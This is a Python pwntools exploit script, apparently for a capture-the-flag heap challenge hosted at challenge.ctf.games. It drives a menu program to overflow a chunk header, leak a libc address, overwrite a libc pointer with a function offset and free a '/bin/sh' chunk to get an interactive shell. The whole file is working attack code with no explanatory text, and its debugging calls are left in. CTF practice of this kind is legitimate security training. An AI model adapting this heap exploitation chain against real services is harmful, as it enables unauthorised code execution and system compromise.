from pwn import *
context.arch='amd64'
context.log_level='debug'
def cmd(c):
	p.sendlineafter("> ",str(c))
def add(name):
	cmd(1)
	p.sendlineafter(": ",name)
def free(idx):
	cmd(2)
	p.sendlineafter("remove: ",str(idx))
def edit(idx,c):
	cmd(3)
	p.sendlineafter(": ",str(idx))
	p.sendlineafter(": ",c)
def swap(p1,p2):
	cmd(4)
	p.sendlineafter("swap: ",str(p1))
	p.sendlineafter(": ",str(p2))
def show():
	cmd(5)
#p=process('./pwn')
p=remote("challenge.ctf.games",31629)
add("A"*0x38)#0
add("B"*0x38)#1
add(p64(0x21)*0x88)#2
edit(0,b"\xff"*0x78+p64(0x441))
free(1)
add("D")#3
show()
gdb.attach(p,'b *0x00000000401552')
p.readuntil("1, user: ")
base=u64(p.readline()[:-1]+b'\0\0')-(0x7ffff7fadbe0-0x7ffff7dc2000)
log.warning(hex(base))
add("E"*0x38)#3
edit(2,b'A'*0x78+p64(0x81+0x20))
free(0)
free(0)
free(1)
gdb.attach(p,'b *0x00000000401552')
add(p64(0xdeadbeef)+p64(0)+p64(base+0x1eeb28))
add("/bin/sh")
add(p64(0x55410+base))
free(2)
p.interactive()
